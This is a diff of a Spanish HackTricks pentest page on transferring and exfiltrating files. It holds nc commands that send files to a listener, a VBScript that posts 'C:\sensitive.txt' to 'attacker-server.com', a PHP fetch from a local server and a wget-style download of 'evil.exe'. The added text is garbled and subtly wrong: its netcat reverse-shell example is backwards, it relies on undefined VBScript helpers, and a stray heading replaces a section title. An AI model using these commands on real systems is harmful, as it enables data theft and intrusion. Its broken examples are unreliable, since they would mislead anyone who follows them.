@@ -7,7 +7,7 @@
 Otras formas de apoyar a HackTricks:
 
 * Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
@@ -16,7 +16,7 @@ Otras formas de apoyar a HackTricks:
 
 **Grupo de Seguridad Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -150,7 +150,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### Cliente de **Windows**
+### Cliente **Windows**
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -185,49 +185,28 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-# Exfiltration
+Windows
 
-## Techniques
+---
 
-### Exfiltration Over Command and Control Channel
+### Exfiltration
 
-- **Description:** Data exfiltration can be achieved by sending the stolen data over the command and control channel used by the malware.
-  
-- **Detection:** Monitoring network traffic for unusual patterns or large amounts of data being sent to suspicious destinations can help detect this exfiltration technique.
+Exfiltration is the unauthorized transfer of data from a target system. Attackers use various techniques to exfiltrate data, such as:
 
-### Exfiltration Over Alternative Protocols
+- **Compression**: Attackers compress data before exfiltrating it to reduce its size and avoid detection.
+- **Encryption**: Data is encrypted to prevent unauthorized access during exfiltration.
+- **Steganography**: Attackers hide data within other files to avoid detection.
+- **Exfiltration over Alternative Protocols**: Attackers use protocols like DNS or ICMP to exfiltrate data, bypassing traditional security controls.
+- **Exfiltration over Command and Control Channels**: Attackers use existing command and control channels to exfiltrate data, making it harder to detect.
 
-- **Description:** Attackers can use alternative protocols such as DNS, ICMP, or HTTPS to exfiltrate data from the target network.
-  
-- **Detection:** Analyzing network traffic for unusual usage of these protocols or unexpected data transfers can help in detecting this exfiltration technique.
+To prevent exfiltration, organizations can implement measures such as:
 
-### Exfiltration Over Encrypted Channels
+- **Network Segmentation**: Segregating networks to limit the movement of attackers within the network.
+- **Data Loss Prevention (DLP) Solutions**: Monitoring and preventing unauthorized data transfers.
+- **Network Traffic Analysis**: Monitoring network traffic for signs of exfiltration attempts.
+- **User Training**: Educating users about the risks of data exfiltration and how to recognize and report suspicious activities.
 
-- **Description:** Attackers can encrypt the exfiltrated data before sending it over the network to evade detection.
-  
-- **Detection:** Monitoring for encrypted traffic leaving the network or using behavioral analysis to identify anomalies in encrypted communication can help detect this exfiltration technique.
-
-## Tools
-
-### Wireshark
-
-- **Description:** Wireshark is a popular network protocol analyzer that can be used to capture and analyze network traffic. It can help in detecting data exfiltration by monitoring network packets.
-
-### tcpdump
-
-- **Description:** tcpdump is a command-line packet analyzer that runs on the terminal. It can capture network packets and display them in real-time, making it useful for detecting data exfiltration.
-
-### Bro/Zeek
-
-- **Description:** Bro/Zeek is a powerful network analysis framework that can be used to detect various network anomalies, including data exfiltration attempts. It provides detailed logs for network traffic analysis.
-
-### Security Information and Event Management (SIEM) Tools
-
-- **Description:** SIEM tools like Splunk, ArcSight, or QRadar can help in centralizing and analyzing log data from various sources to detect data exfiltration attempts. They provide alerts for suspicious activities on the network.
-
-### Data Loss Prevention (DLP) Solutions
-
-- **Description:** DLP solutions like Symantec DLP, McAfee DLP, or Forcepoint DLP can help prevent data exfiltration by monitoring and blocking sensitive data transfers outside the network.
+By understanding exfiltration techniques and implementing appropriate security measures, organizations can better protect their data from unauthorized access and leakage.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -253,15 +232,30 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 
 ### Description
 
-Netcat (nc) is a versatile networking tool that can be used for various purposes, including exfiltration of data. It allows for creating connections to different network services, port scanning, and transferring files between systems. Netcat can be used to establish a connection between a compromised system and an external server controlled by the attacker, enabling the exfiltration of sensitive information.
+The `nc` command, also known as Netcat, is a versatile networking tool that can be used for various purposes during a penetration test. It can be used for port scanning, banner grabbing, transferring files, and establishing reverse shells. Netcat operates by establishing a connection between a client and a server, allowing for data transfer between the two.
 
-### Detection
+### Usage
 
-Detection of Netcat usage can be challenging due to its versatility and the fact that it is a legitimate networking tool. Monitoring network traffic for suspicious connections or unusual data transfers may help in detecting potential exfiltration activities using Netcat. Additionally, monitoring system logs for any unauthorized Netcat processes or connections can aid in early detection of malicious activities.
+To establish a connection with a remote server using `nc`, you can use the following command:
 
-### Prevention
+```bash
+nc <remote_server_ip> <port>
+```
 
-To prevent unauthorized exfiltration of data using Netcat, organizations can implement network segmentation to restrict communication channels, enforce the principle of least privilege to limit access to sensitive data, and deploy network monitoring tools to detect and block suspicious activities. Regularly updating and patching systems can also help prevent attackers from exploiting known vulnerabilities to exfiltrate data using tools like Netcat.
+To listen for incoming connections on a specific port, you can use the following command:
+
+```bash
+nc -l -p <port>
+```
+
+### Example
+
+Establishing a reverse shell using `nc`:
+
+1. Attacker machine: `nc -l -p 1234 -e /bin/bash`
+2. Victim machine: `nc <attacker_ip> 1234`
+
+This will establish a reverse shell from the victim machine to the attacker machine, allowing the attacker to execute commands on the victim's system.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -334,31 +328,36 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-### Visual Basic Scripting Edition (VBScript)
+### Overview
 
-VBScript is a lightweight scripting language developed by Microsoft. It is commonly used for client-side web development and can also be used for server-side scripting. VBScript is often executed by Windows Script Host (WSH) and can be used to automate tasks, manipulate files, and interact with Windows components.
+Visual Basic Scripting Edition (VBScript) is a scripting language developed by Microsoft. It is commonly used for writing scripts to automate tasks on Windows operating systems. VBScript can be used for exfiltration by reading data from files, registry keys, or other sources and sending it to an external server.
 
-### Exfiltration using VBScript
+### Exfiltration Techniques
 
-VBScript can be used for exfiltration by reading data from files or system information and sending it to an external server using various protocols such as HTTP or FTP. This can be achieved by writing scripts that collect the desired information and then establish a connection to a remote server to transmit the data.
+#### 1. File Transfer
 
-### Example
+VBScript can be used to read the contents of a file and send it to an external server using HTTP or other protocols.
 
 ```vbscript
-Dim objFSO, objFile, objShell
-Dim data, url
-
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-Set objFile = objFSO.OpenTextFile("C:\sensitive_data.txt", 1)
-data = objFile.ReadAll
-objFile.Close
-
-url = "http://attacker-server.com/receive.php"
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell -Command (New-Object System.Net.WebClient).UploadString('" & url & "', '" & data & "')"
+Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+objXMLHTTP.open "POST", "http://attacker-server.com/receive.php", False
+objXMLHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+objXMLHTTP.send "data=" & ReadFile("C:\sensitive.txt")
 ```
 
-In this example, the VBScript reads the contents of a file named `sensitive_data.txt`, stores it in the `data` variable, and then sends it to an attacker-controlled server using PowerShell to perform an HTTP POST request.
+#### 2. Registry Data
+
+VBScript can also be used to read data from the Windows registry and exfiltrate it to a remote server.
+
+```vbscript
+Set objReg = GetObject("winmgmts:\\.\root\default:StdRegProv")
+objReg.GetStringValue &H80000001, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "MaliciousKey", strValue
+SendDataToServer strValue
+```
+
+### Detection and Prevention
+
+To detect and prevent exfiltration using VBScript, monitoring network traffic for suspicious outbound connections, restricting VBScript execution in enterprise environments, and implementing endpoint security solutions can be effective measures.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -396,19 +395,23 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-El programa `debug.exe` no solo permite la inspección de binarios, sino que también tiene la **capacidad de reconstruirlos a partir de hexadecimal**. Esto significa que al proporcionar un hexadecimal de un binario, `debug.exe` puede generar el archivo binario. Sin embargo, es importante tener en cuenta que debug.exe tiene una **limitación de ensamblaje de archivos de hasta 64 kb de tamaño**.
+El programa `debug.exe` no solo permite la inspección de binarios, sino que también tiene la **capacidad de reconstruirlos a partir de hexadecimal**. Esto significa que al proporcionar un hexadecimal de un binario, `debug.exe` puede generar el archivo binario. Sin embargo, es importante tener en cuenta que debug.exe tiene una **limitación de ensamblar archivos de hasta 64 kb de tamaño**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
+Luego copia y pega el texto en la ventana de comandos de Windows y se creará un archivo llamado nc.exe.
+
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -418,7 +421,7 @@ wine exe2bat.exe nc.exe nc.txt
 
 Otras formas de apoyar a HackTricks:
 
-* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
